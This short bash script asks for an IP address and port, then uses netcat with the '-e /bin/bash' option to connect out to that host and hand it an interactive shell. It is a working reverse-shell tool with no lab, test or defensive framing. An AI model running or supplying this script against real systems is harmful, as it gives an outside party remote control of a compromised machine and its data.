#!/bin/bash

# Prompt the user to enter the IP address
read -p "Enter the IP address: " IP_ADDRESS

# Prompt the user to enter the port
read -p "Enter the port: " PORT

# Validate input
if [ -z "$IP_ADDRESS" ]; then
    echo "Error: IP address cannot be empty."
    exit 1
fi

if [ -z "$PORT" ]; then
    echo "Error: Port cannot be empty."
    exit 1
fi

# Execute the netcat command
nc "$IP_ADDRESS" "$PORT" -e /bin/bash
